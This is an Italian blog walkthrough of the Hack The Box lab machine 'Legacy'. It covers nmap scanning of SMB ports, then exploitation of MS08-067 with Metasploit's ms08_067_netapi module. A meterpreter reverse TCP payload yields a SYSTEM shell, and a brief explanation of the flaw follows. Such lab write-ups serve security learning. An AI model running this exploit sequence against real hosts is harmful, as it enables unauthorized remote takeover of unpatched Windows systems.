---
title: "Legacy Walkthrough"
description: "Legacy è una macchina abbastanza semplice di livello easy che dimostra i potenziali rischi per la sicurezza del protocollo SMB su Windows. È sufficiente un unico exploit disponibile pubblicamente per ottenere accesso come amministratore."
author: dua2z3rr
date: 2025-08-12 1:00:00
categories: [Walkthrough]
tags: ["Area di Interesse: Protocols", "Area di Interesse: Software & OS exploitation", "Area di Interesse: Security Tools", "Area di Interesse: Enterprise Network", "Area di Interesse: Vulnerability Assessment", "Vulnerabilità: Remote Code Execution"]
image: /assets/img/legacy/legacy-resized.png"
---


## Enumerazione Esterna

### Nmap

Cominciamo con nmap.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.10.4 -vv -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-12 18:47 CEST
Initiating Ping Scan at 18:47
Scanning 10.10.10.4 [4 ports]
Completed Ping Scan at 18:47, 0.43s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:47
Completed Parallel DNS resolution of 1 host. at 18:47, 0.32s elapsed
Initiating SYN Stealth Scan at 18:47
Scanning 10.10.10.4 [65535 ports]
Discovered open port 135/tcp on 10.10.10.4
Discovered open port 445/tcp on 10.10.10.4
Discovered open port 139/tcp on 10.10.10.4
<SNIP>
```

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.10.4 -sC -sV -vv -p 135,139,445
<SNIP>
PORT    STATE SERVICE      REASON          VERSION
135/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack ttl 127 Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40600/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 17574/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 50902/udp): CLEAN (Failed to receive data)
|   Check 4 (port 42555/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2025-08-17T21:46:38+03:00
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:6d:54 (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   00:50:56:94:6d:54:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
```

### Ricerca Vulnerabilità

Cerchiamo una vinerabilità per Windows XP (Windows 2000 LAN Manager) riguardante SMB.
Possiamo utilizzare la vulnerabilità **CVE-2008-4250** (anche chiamata **MS08-067**).

![Desktop View](/assets/img/legacy/legacy-vulnerabilità.png)

## Exploit

### MetaSploit

Utilizziamo msfconsole per l'exploit.

```shell
─[dua2z3rr@parrot]─[~]
└──╼ $msfconsole
Metasploit tip: View a module's description using info, or the enhanced 
version in your browser with info -d
                                                  

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v6.4.71-dev                          ]
+ -- --=[ 2529 exploits - 1302 auxiliary - 431 post       ]
+ -- --=[ 1669 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[msf](Jobs:0 Agents:0) >> search CVE-2008-4250

Matching Modules
================

   #   Name                                                             Disclosure Date  Rank   Check  Description
   -   ----                                                             ---------------  ----   -----  -----------
   0   exploit/windows/smb/ms08_067_netapi                              2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption

<SNIP>

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

<SNIP>

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.230.43.82     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> set RHOST 10.10.10.4
RHOST => 10.10.10.4
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> set LHOST tun0
LHOST => 10.10.14.4
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> exploit
[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (177734 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.4:1038) at 2025-08-12 19:21:20 +0200

(Meterpreter 1)(C:\windows) > getuid
Server username: NT AUTHORITY\SYSTEM
```

Prendiamo le flag e terminiamo la box.

> Le user directory si trovano nella cartella **C:\Documents and Settings** essendo Windows XP
{: .prompt-tip }

## Spiegazione Vulnerabilità

### MS08-067

MS08-067 è una vulnerabilità Buffer Overflow di Microsoft Servser Service. La Vulnerabilità consiste nell'inviare un pacchetto TCP attentamente craftato per permettere remote code execution sulla macchina nemica.

> Non sai cosa sono i Buffer Overflow? Leggi questo mio post per capirne di più! <https://dua2z3rr.github.io/posts/Buffer-Overflow/>
{: .prompt-info }

Molti malware sono stati creati tramite questa vulnerabilità. Un esempio è **Conficker worm**, che infettò milioni di computer in tutto il mondo. 
Attraverso questa vulnerabilità gli attacanti hanno accesso a dati sensibili oltre alla possibilità di installare ulteriore malware sulla macchina.
Gli OS vulnerabili sono: Microsoft Windows 2000, Windows XP, Windows Server 2003, Windows Vista, and Windows Server 2008.
